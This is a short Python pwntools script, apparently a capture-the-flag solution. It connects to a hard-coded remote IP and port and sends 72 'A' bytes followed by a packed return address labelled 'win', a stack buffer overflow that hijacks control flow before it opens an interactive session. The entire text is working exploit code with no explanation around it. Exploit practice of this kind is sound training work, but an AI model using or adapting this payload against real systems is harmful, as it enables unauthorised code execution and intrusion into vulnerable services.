from pwn import *
h,p = '111.200.241.244',53695
win = 0x40060d
p = remote(h,p)
pay = "A"*72+p64(win)
p.sendlineafter('>',pay)
p.interactive()
